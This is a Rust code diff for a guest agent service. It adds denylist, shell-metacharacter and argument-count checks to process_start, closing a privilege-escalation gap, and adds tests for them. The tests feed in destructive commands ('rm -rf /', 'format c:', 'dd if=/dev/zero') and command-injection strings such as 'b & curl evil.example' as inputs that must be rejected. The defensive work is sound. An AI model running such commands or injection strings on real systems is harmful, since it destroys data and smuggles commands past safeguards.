@@ -245,6 +245,47 @@ impl GuestAgent for GuestAgentService {
             return Err(Status::invalid_argument("path must not be empty"));
         }
 
+        // P4.a / Sec F4: enforce the same denylist + shell-metacharacter
+        // gate that `run_command` runs. Before this fix, `process_start`
+        // (especially with `run_as="system"`) was a strictly more
+        // dangerous primitive than `run_command` and yet skipped both
+        // checks. A caller blocked from `run_command(rm,[-rf,/])` could
+        // simply call `process_start("rm",["-rf","/"], run_as="system")`
+        // and receive SYSTEM-privileged execution. Both checks now run
+        // BEFORE the SYSTEM branch (line ~298) so escalation attempts
+        // are stopped at the door.
+        //
+        // Argument count cap mirrors `run_command`'s MAX_ARG_COUNT.
+        if req.args.len() > MAX_ARG_COUNT {
+            return Err(Status::invalid_argument(format!(
+                "process_start args exceed maximum of {MAX_ARG_COUNT}"
+            )));
+        }
+        if is_denied_command(&req.path, &req.args) {
+            tracing::warn!(
+                target: "signalman::audit",
+                path = %req.path,
+                arg_count = req.args.len(),
+                run_as = %req.run_as,
+                "process_start denied: path/args matched denied-command pattern"
+            );
+            return Err(Status::permission_denied(
+                "process_start matches a denied command pattern",
+            ));
+        }
+        if contains_shell_metacharacters(&req.path, &req.args) {
+            tracing::warn!(
+                target: "signalman::audit",
+                path = %req.path,
+                arg_count = req.args.len(),
+                run_as = %req.run_as,
+                "process_start denied: path/args contain shell metacharacters"
+            );
+            return Err(Status::invalid_argument(
+                "process_start path/args may not contain shell metacharacters (; | &)",
+            ));
+        }
+
         let working_dir = if req.working_directory.is_empty() {
             None
         } else {
@@ -975,6 +1016,97 @@ mod tests {
 
         assert!(result.is_err());
         assert_eq!(result.unwrap_err().code(), tonic::Code::InvalidArgument);
+    }
+
+    // ── P4.a / Sec F4: process_start denylist parity ─────────────
+
+    fn make_process_start_request(path: &str, args: Vec<String>) -> ProcessStartRequest {
+        ProcessStartRequest {
+            path: path.to_string(),
+            args,
+            working_directory: String::new(),
+            env: Default::default(),
+            wait_for_exit: false,
+            timeout_ms: 0,
+            run_as: String::new(),
+        }
+    }
+
+    #[tokio::test]
+    async fn test_process_start_rejects_denied_command_pattern() {
+        // Before P4.a, `process_start` skipped this check entirely —
+        // a caller blocked from `run_command(rm,[-rf,/])` could simply
+        // pass the same args through `process_start` and get them
+        // executed (often with run_as=system). Test pins the new gate.
+        let svc = make_service();
+        for (path, args) in [
+            ("rm", vec!["-rf".to_string(), "/".to_string()]),
+            ("format", vec!["c:".to_string()]),
+            ("dd", vec!["if=/dev/zero".to_string()]),
+        ] {
+            let result = svc
+                .process_start(Request::new(make_process_start_request(path, args)))
+                .await;
+            assert!(
+                result.is_err(),
+                "process_start should reject `{path}` denylist match",
+            );
+            assert_eq!(
+                result.unwrap_err().code(),
+                tonic::Code::PermissionDenied,
+                "denied-command pattern must surface as PermissionDenied"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn test_process_start_rejects_shell_metacharacters() {
+        let svc = make_service();
+        // Each variant places a metachar in either the path or one
+        // arg, in cases that DO NOT also match the denied-command
+        // denylist (denylist runs first and would surface as
+        // PermissionDenied; we want to pin the metachar gate
+        // specifically, which surfaces as InvalidArgument).
+        let cases: &[(&str, Vec<String>)] = &[
+            ("/bin/echo; touch foo", vec![]),
+            ("echo", vec!["hello | tee bar".to_string()]),
+            ("echo", vec!["a".to_string(), "b & curl evil.example".to_string()]),
+        ];
+        for (path, args) in cases {
+            let result = svc
+                .process_start(Request::new(make_process_start_request(
+                    path,
+                    args.clone(),
+                )))
+                .await;
+            assert!(
+                result.is_err(),
+                "process_start must reject metachars in `{path}` / {args:?}"
+            );
+            assert_eq!(
+                result.unwrap_err().code(),
+                tonic::Code::InvalidArgument,
+                "shell-metachar gate must surface as InvalidArgument"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn test_process_start_rejects_excessive_arg_count() {
+        let svc = make_service();
+        let many: Vec<String> = (0..(MAX_ARG_COUNT + 1))
+            .map(|i| format!("arg{i}"))
+            .collect();
+        let result = svc
+            .process_start(Request::new(make_process_start_request(
+                "echo", many,
+            )))
+            .await;
+        assert!(result.is_err(), "process_start must cap arg count");
+        assert_eq!(
+            result.unwrap_err().code(),
+            tonic::Code::InvalidArgument
+        );
     }
 
     #[tokio::test]
